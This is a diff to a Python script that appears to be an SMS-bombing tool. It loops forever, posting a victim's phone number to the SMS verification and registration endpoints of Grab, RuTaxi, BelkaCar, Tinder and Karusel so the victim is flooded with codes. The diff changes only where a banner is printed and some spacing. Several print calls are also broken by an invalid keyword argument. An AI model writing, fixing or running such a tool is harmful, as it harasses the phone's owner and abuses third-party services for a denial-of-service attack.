@@ -133,6 +133,8 @@ _phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
 
 iteration = 0
 
+banner()
+
 failed = 0
 requested = 0
 sonuc = 0
@@ -146,8 +148,7 @@ print("             Successful Requests     : ", success)
 print("             Failed Requests         : ", failed)
 print("=======================================================")
 
-clr()
-banner()
+
 while True:
 	_email = _name+f'{iteration}'+'@gmail.com'
 	email = _name+f'{iteration}'+'@gmail.com'
@@ -156,31 +157,31 @@ while True:
 
 	try:
 		requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
-		print('[+] Grab Requests Successful!',requested = requested + 1)
+		print('[+] Grab Requests Successful!', requested = requested + 1)
 	except:
 		print('[-] Grab Requests Failed!')
 
 	try:
 		requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
-		print('[+] RuTaxi Requests Successful!',requested = requested + 1)
+		print('[+] RuTaxi Requests Successful!', requested = requested + 1)
 	except:
 		print('[-] RuTaxi Requests Failed!')
 
 	try:
 		requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
-		print('[+] BelkaCar Requests Successful!',requested = requested + 1)
+		print('[+] BelkaCar Requests Successful!', requested = requested + 1)
 	except:
 		print('[-] BelkaCar Requests Failed!')
 
 	try:
 		requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
-		print('[+] Tinder Requests Successful!',requested = requested + 1)
+		print('[+] Tinder Requests Successful!', requested = requested + 1)
 	except:
 		print('[-] Tinder Requests Failed!')
 
 	try:
 		requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
-		print('[+] Karusel Requests Successful!',requested = requested + 1)
+		print('[+] Karusel Requests Successful!', requested = requested + 1)
 	except:
 		print('[-] Karusel Requests Failed!')
 
